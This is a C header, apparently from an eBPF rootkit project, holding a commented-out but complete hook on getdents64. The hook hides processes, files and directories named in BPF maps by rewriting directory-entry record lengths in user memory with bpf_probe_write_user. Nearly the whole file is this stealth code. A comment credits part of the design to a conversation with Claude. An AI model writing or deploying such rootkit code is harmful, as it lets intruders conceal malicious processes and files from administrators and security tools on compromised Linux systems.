/**
 * Main code logic for hiding processes.
 * 
 * @author Yekuuun
 */

#ifndef MOD_HIDE_FROM_H
#define MOD_HIDE_FROM_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../lib/ft_utils.h"

//https://elixir.bootlin.com/linux/v6.17.3/source/include/linux/fs_types.h#L37
#ifndef DT_DIR
#define DT_DIR 4
#endif 

#ifndef DT_REG
#define DT_REG 8
#endif

#define D_MAX_DEPTH      32

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  HIDE PROCESSES
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * Hook __x64_sys_getdents64. using Fexit to get current ctx + return code.
 * 
 * @note : long conv with Claude & research. consider using Kprobe & Kretprobe for same result.
 * Fexit only on linux kernel version > 5.5 & way more easier avoiding usage of cache to store kprobe data when hitting kretprobe.
 */
// SEC("fexit/do_sys_getdents64")
// int BPF_PROG(fexit_sysgetdents64, unsigned int fd, struct linux_dirent64 *dirent, unsigned int count, long ret) 
// {
//     if(ret <= 0)
//         return ret;

//     if(__is_target_bin())
//         return ret;

//     struct linux_dirent64 *dirp = dirent;
//     __u64 curr_offset           = 0;

//     struct linux_dirent64 *last = NULL; //Last valid. (non hidden) entry seen so far.

//     //https://elixir.bootlin.com/linux/v6.17.3/source/include/linux/dirent.h#L5
//     // struct linux_dirent64 {
//     //     u64		d_ino;
//     //     s64		d_off;
//     //     unsigned short	d_reclen;
//     //     unsigned char	d_type;
//     //     char		d_name[];
//     // };

//     for(short i = 0; i < D_MAX_DEPTH; i++) {
//         struct linux_dirent64 *curr = (struct linux_dirent64*)((char*)dirp + curr_offset);

//         //end user space buff.
//         if(curr_offset >= (__u64)ret)
//             break;
        
//         //quick validation on d_reclen.
//         __u16 d_reclen = 0;
//         if (bpf_probe_read_user(&d_reclen, sizeof(__u16), &curr->d_reclen) < 0)
//             break;

//         if(d_reclen < sizeof(struct linux_dirent64))
//             break;

//         //collect data.
//         char d_name[DNAME_MAX] = {0};
//         __u8 d_type            = DT_REG;

//         if (bpf_probe_read_user(&d_type, sizeof(__u8), &curr->d_type) < 0) {
//             curr_offset += d_reclen;
//             continue; // Skip unreadable entry - move to next.
//         }

//         if (bpf_probe_read_user_str(d_name, DNAME_MAX, curr->d_name) < 0) {
//             curr_offset += d_reclen;
//             continue; // Skip unreadable name - move to next.
//         }

//         __u8 *hidden = NULL;
//         if (ft_isnumeric(d_name)) {
//             int pid = ft_atoi(d_name);
//             hidden  = bpf_map_lookup_elem(&hide_pid_cache, &pid);
//         } 
//         else {
//             // Name isn't numeric - use d_type to pick the correct cache.
//             if (d_type == DT_DIR)
//                 hidden = bpf_map_lookup_elem(&hide_from_cache_dir, &d_name);
//             else
//                 hidden = bpf_map_lookup_elem(&hide_from_cache_file, &d_name);
//         }

//         if(hidden && *hidden == 1){
//             if(last != NULL){
//                 __u16 last_reclen = 0;
//                 bpf_probe_read_user(&last_reclen, sizeof(__u16), &last->d_reclen);

//                 //Extend last's record to cover tmp's space - effectively skipping it.
//                 __u16 new_len = last_reclen + d_reclen;
//                 bpf_probe_write_user(&last->d_reclen, &new_len, sizeof(__u16));
//             }   
//         }
//         else {
//             last = curr;
//         }

//         curr_offset += d_reclen;
//     }

//     return ret;
// }

//-----------------------------------------------------

#endif